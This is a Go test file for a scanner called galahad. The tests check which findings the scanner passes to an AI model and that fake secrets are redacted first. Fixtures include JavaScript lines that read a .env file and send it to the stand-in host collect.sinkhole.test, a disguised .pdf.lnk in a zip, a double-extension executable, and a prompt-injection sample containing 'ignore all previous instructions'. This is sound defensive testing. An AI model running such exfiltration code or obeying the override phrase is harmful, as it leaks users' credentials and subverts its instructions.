package decision_test

import (
	"archive/zip"
	"bytes"
	"context"
	"encoding/json"
	"io/fs"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/mrdhira/galahad/internal/analyze"
	"github.com/mrdhira/galahad/internal/analyze/static"
	"github.com/mrdhira/galahad/internal/decision"
	"github.com/mrdhira/galahad/internal/protocol"
)

const revealing = "Acme-layoffs-2026"

// The fake secrets are built from pieces, so no provider-shaped literal sits in the source.
var (
	fakeGitHub = "ghp_" + "0123456789abcdefghijklmnopqrstuvwxyz"
	fakeAWSID  = "AKIA" + "IOSFODNN7EXAMPLE"
	fakeAWSKey = "wJalrXUtnFEMI/K7MDENG/" + "bPxRfiCYEXAMPLEKEY"
	fakePass   = "hunter2" + "-not-a-real-password"
	fakeURLPw  = "pa55" + "word-not-real"
)

const corpusRoot = "../../testdata/corpus"

// corpusAs copies the fixture into a scratch directory under the name as, so that the target has a
// revealing name, and returns the new path.
func corpusAs(name, as string) func(t *testing.T) string {
	return func(t *testing.T) string {
		t.Helper()
		src := filepath.Join(corpusRoot, name)
		dst := filepath.Join(t.TempDir(), as)
		err := filepath.WalkDir(src, func(p string, d fs.DirEntry, err error) error {
			if err != nil {
				return err
			}
			rel, _ := filepath.Rel(src, p)
			if d.IsDir() {
				return os.MkdirAll(filepath.Join(dst, rel), 0o700)
			}
			b, err := os.ReadFile(p)
			if err != nil {
				return err
			}
			return os.WriteFile(filepath.Join(dst, rel), b, 0o600)
		})
		if err != nil {
			t.Fatal(err)
		}
		return dst
	}
}

// fileAs returns a builder that writes content to a file called name in a scratch directory.
func fileAs(name string, content func() []byte) func(t *testing.T) string {
	return func(t *testing.T) string {
		t.Helper()
		p := filepath.Join(t.TempDir(), name)
		if err := os.WriteFile(p, content(), 0o600); err != nil {
			t.Fatal(err)
		}
		return p
	}
}

func text(s string) func() []byte { return func() []byte { return []byte(s) } }

func secretScript() []byte {
	return []byte("const fs = require('fs');\n" +
		"const k = '" + fakeGitHub + "';\n" +
		"const env = fs.readFileSync('../.env'); require('https').request({host: 'collect.sinkhole.test', headers: {Authorization: 'Bearer " + fakeGitHub + "'}}).end(env);\n" +
		"const cfg = {password: '" + fakePass + "', aws_secret_access_key: '" + fakeAWSKey + "', id: '" + fakeAWSID + "'};\n" +
		"const u = 'https://admin:" + fakeURLPw + "@collect.sinkhole.test/c';\n")
}

// secretDir writes a directory in which each script reads .env and sends it, and carries one more
// kind of fake secret on the same line. Every script gets its own finding, so each secret is in a snippet.
func secretDir(t *testing.T) string {
	t.Helper()
	dir := filepath.Join(t.TempDir(), revealing)
	if err := os.MkdirAll(dir, 0o700); err != nil {
		t.Fatal(err)
	}
	const head = "const env = require('fs').readFileSync('../.env'); require('https').request({host: 'collect.sinkhole.test', "
	for name, tail := range map[string]string{
		"a.js": "headers: {Authorization: 'Bearer " + fakeGitHub + "'}}).end(env);\n",
		"b.js": "password: '" + fakePass + "'}).end(env);\n",
		"c.js": "aws_secret_access_key: '" + fakeAWSKey + "'}).end(env);\n",
		"d.js": "path: 'https://admin:" + fakeURLPw + "@collect.sinkhole.test/c'}).end(env);\n",
		"e.js": "id: '" + fakeAWSID + "'}).end(env);\n",
	} {
		if err := os.WriteFile(filepath.Join(dir, name), []byte(head+tail), 0o600); err != nil {
			t.Fatal(err)
		}
	}
	return dir
}

func lnkInZip() []byte {
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	lnk := append([]byte{0x4c, 0, 0, 0, 0x01, 0x14, 0x02, 0, 0, 0, 0, 0, 0xc0, 0, 0, 0, 0, 0, 0, 0x46}, make([]byte, 56)...)
	for name, body := range map[string][]byte{"invoice.pdf.lnk": lnk, "setup.js": secretScript()} {
		w, _ := zw.Create(name)
		_, _ = w.Write(body)
	}
	_ = zw.Close()
	return buf.Bytes()
}

func exeBytes() []byte { return append([]byte("MZ"), make([]byte, 128)...) }

// readCorpusFile returns a fixture file. A fixture that cannot be read ends the run: the test
// would otherwise run against an empty target.
func readCorpusFile(rel string) []byte {
	b, err := os.ReadFile(filepath.Join(corpusRoot, rel))
	if err != nil {
		panic(err)
	}
	return b
}

// encodings returns the request as the wire has it and as it is HTML-escaped.
func encodings(t *testing.T, req protocol.DecisionRequest) (wire, escaped string) {
	t.Helper()
	var b bytes.Buffer
	enc := json.NewEncoder(&b)
	enc.SetEscapeHTML(false)
	if err := enc.Encode(req); err != nil {
		t.Fatal(err)
	}
	e, err := json.Marshal(req)
	if err != nil {
		t.Fatal(err)
	}
	return b.String(), string(e)
}

// findingText is every string of the findings of res, which may reach the provider as it is.
func findingText(res protocol.Result) string {
	var b strings.Builder
	for _, f := range res.Findings {
		b.WriteString(f.Title + "\n")
		for _, e := range f.Evidence {
			b.WriteString(e.Path + "\n" + e.Snippet + "\n")
		}
	}
	return b.String()
}

func TestSelectOnCorpus(t *testing.T) {
	tests := []struct {
		name string
		// inputs
		build func(t *testing.T) string
		// expectations
		wantOK        bool
		wantRules     []string
		wantRedacted  []string // kinds that Redact must count
		wantSecrets   []string // never in the request, in either encoding
		wantContains  []string // in the request, in both encodings
		wantAbsent    []string // not in the request
		wantNoSnippet []string // rules whose finding goes without snippet
	}{
		{
			name:         "fake interview repo sends the findings and no key",
			build:        corpusAs("fake-interview-repo", revealing),
			wantOK:       true,
			wantRules:    []string{"GAL-AUTOEXEC-010", "GAL-EXFIL-001", "GAL-AUTOEXEC-001", "GAL-AUTOEXEC-005"},
			wantSecrets:  []string{fakeAWSID, fakeAWSKey},
			wantAbsent:   []string{"Take-home coding task", "interview-task"},
			wantContains: []string{"scripts/setup.js"},
		},
		{
			name:         "p9 prompt injection repo sends the injection as a redacted snippet",
			build:        corpusAs("p9-prompt-injection-repo", revealing),
			wantOK:       true,
			wantRules:    []string{"GAL-INJECT-001", "GAL-AUTOEXEC-010", "GAL-AUTOEXEC-001"},
			wantRedacted: []string{protocol.RedactAWSAccessKey, protocol.RedactAWSSecret},
			wantSecrets:  []string{fakeAWSID, fakeAWSKey},
			wantContains: []string{"ignore all previous instructions", "[REDACTED:"},
			wantAbsent:   []string{"Orbit Notes", "buy milk", "A small note-taking helper"},
		},
		{
			name:         "devcontainer init",
			build:        corpusAs("p1-devcontainer-init", revealing),
			wantOK:       true,
			wantContains: []string{".devcontainer"},
		},
		{
			name:         "folder open curl",
			build:        corpusAs("p1-folderopen-curl", revealing),
			wantOK:       true,
			wantRules:    []string{"GAL-AUTOEXEC-001"},
			wantContains: []string{".vscode/tasks.json"},
		},
		{
			name:       "eml lure as a file target",
			build:      fileAs(revealing+".eml", func() []byte { return readCorpusFile("p6-eml-lure/lure.eml") }),
			wantOK:     true,
			wantAbsent: []string{"recruiter@recruit-sinkhole.test", "candidate@example.test"},
		},
		{
			name:          "double extension executable hides the name and the snippet",
			build:         fileAs(revealing+".pdf.exe", exeBytes),
			wantOK:        true,
			wantRules:     []string{"GAL-NAME-001"},
			wantContains:  []string{"(target)"},
			wantNoSnippet: []string{"GAL-NAME-001"},
		},
		{
			name:         "script target with fake secrets",
			build:        fileAs(revealing+".pdf.js", secretScript),
			wantOK:       true,
			wantRules:    []string{"GAL-NAME-001", "GAL-EXFIL-001"},
			wantRedacted: []string{protocol.RedactGitHubToken},
			wantSecrets:  []string{fakeGitHub, fakeAWSID, fakeAWSKey, fakePass, fakeURLPw},
			wantContains: []string{"(target)", "[REDACTED:"},
		},
		{
			name:   "directory with every kind of fake secret in a snippet",
			build:  secretDir,
			wantOK: true,
			wantRedacted: []string{
				protocol.RedactGitHubToken, protocol.RedactAssignment, protocol.RedactAWSSecret,
				protocol.RedactURLCredentials, protocol.RedactAWSAccessKey,
			},
			wantSecrets:  []string{fakeGitHub, fakeAWSID, fakeAWSKey, fakePass, fakeURLPw},
			wantContains: []string{"[REDACTED:", "a.js", "e.js"},
		},
		{
			name:         "zip with a lnk member and secrets",
			build:        fileAs(revealing+".zip", lnkInZip),
			wantOK:       true,
			wantRedacted: []string{protocol.RedactGitHubToken},
			wantSecrets:  []string{fakeGitHub, fakeAWSID, fakeAWSKey, fakePass, fakeURLPw},
			wantContains: []string{"(target)!/"},
		},
		{name: "benign pdf", build: corpusAs("benign-pdf", revealing+".pdf")},
		{name: "benign eml newsletter", build: corpusAs("benign-eml-newsletter", revealing)},
		{name: "benign express app", build: corpusAs("benign-express-app", revealing)},
		{name: "benign go cli", build: corpusAs("benign-go-cli", revealing)},
		{name: "benign husky lint sends only its low finding", build: corpusAs("benign-husky-lint", revealing), wantOK: true, wantRules: []string{"GAL-AUTOEXEC-006"}, wantContains: []string{"npx lint-staged"}},
		{name: "benign local deps", build: corpusAs("benign-local-deps", revealing)},
		{name: "benign minified js", build: corpusAs("benign-minified-js", revealing)},
		{name: "benign npm deps", build: corpusAs("benign-npm-deps", revealing)},
		{name: "benign python lib sends only its low finding", build: corpusAs("benign-python-lib", revealing), wantOK: true, wantRules: []string{"GAL-AUTOEXEC-007"}},
		{name: "benign text file target", build: fileAs(revealing+".txt", text("Meeting notes for Tuesday.\n"))},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			target := tt.build(t)
			res, err := analyze.Run(context.Background(), target, static.All())
			if err != nil {
				t.Fatal(err)
			}
			res.Tool = protocol.Tool{Name: "galahad-agent", Version: "test"}
			if err := res.Validate(); err != nil {
				t.Fatalf("result is invalid: %v", err)
			}
			if res.Target.Name != filepath.Base(target) {
				t.Fatalf("target name = %q, want %q", res.Target.Name, filepath.Base(target))
			}

			req, ok, err := decision.Select(res, "test-model")
			if err != nil {
				t.Fatalf("Select: %v", err)
			}
			if ok != tt.wantOK {
				t.Fatalf("ok = %v, want %v (findings: %s)", ok, tt.wantOK, findingText(res))
			}
			if !ok {
				if len(req.Input.Findings) != 0 {
					t.Errorf("a skipped request holds %d findings", len(req.Input.Findings))
				}
				return
			}

			counts := decision.Redact(&req)
			if err := req.Validate(); err != nil {
				t.Fatalf("redacted request is invalid: %v", err)
			}
			wire, escaped := encodings(t, req)
			for _, enc := range []string{wire, escaped} {
				if len(enc) > protocol.MaxDecisionRequest {
					t.Errorf("request is %d bytes, max %d", len(enc), protocol.MaxDecisionRequest)
				}
			}
			if n := len(req.Input.Findings); n == 0 || n > protocol.MaxDecisionFindings {
				t.Errorf("request holds %d findings, want 1-%d", n, protocol.MaxDecisionFindings)
			}

			// What the request must not hold.
			seen := findingText(res)
			absent := slices.Concat(tt.wantSecrets, tt.wantAbsent, []string{res.Target.Name, res.Target.SHA256})
			for _, f := range res.Files {
				absent = append(absent, f.SHA256)
				if !strings.Contains(seen, f.Path) {
					absent = append(absent, f.Path) // a file that no finding names is not sent
				}
			}
			for _, ioc := range res.IOCs {
				if !strings.Contains(seen, ioc.Value) {
					absent = append(absent, ioc.Value) // an indicator that no finding shows is not sent
				}
			}
			for _, a := range absent {
				if a == "" {
					continue
				}
				for label, enc := range map[string]string{"wire": wire, "escaped": escaped} {
					if strings.Contains(enc, a) {
						t.Errorf("%s request holds %q:\n%s", label, a, wire)
					}
				}
			}
			for _, w := range tt.wantContains {
				for label, enc := range map[string]string{"wire": wire, "escaped": escaped} {
					if !strings.Contains(enc, w) {
						t.Errorf("%s request lacks %q:\n%s", label, w, wire)
					}
				}
			}

			got := map[string]protocol.DecisionFinding{}
			for _, f := range req.Input.Findings {
				got[f.RuleID] = f
			}
			for _, r := range tt.wantRules {
				if _, ok := got[r]; !ok {
					t.Errorf("request lacks a %s finding:\n%s", r, wire)
				}
			}
			for _, r := range tt.wantNoSnippet {
				if f, ok := got[r]; ok && f.Snippet != "" {
					t.Errorf("%s is sent with the snippet %q", r, f.Snippet)
				}
			}
			for _, k := range tt.wantRedacted {
				if counts[k] == 0 {
					t.Errorf("no %s redaction, counts = %v", k, counts)
				}
			}
			for _, f := range req.Input.Findings {
				if f.Analyzer == "network" && (f.Path != "" || f.Line != 0 || f.Snippet != "") {
					t.Errorf("host finding %s is sent with evidence: %+v", f.RuleID, f)
				}
			}
		})
	}
}
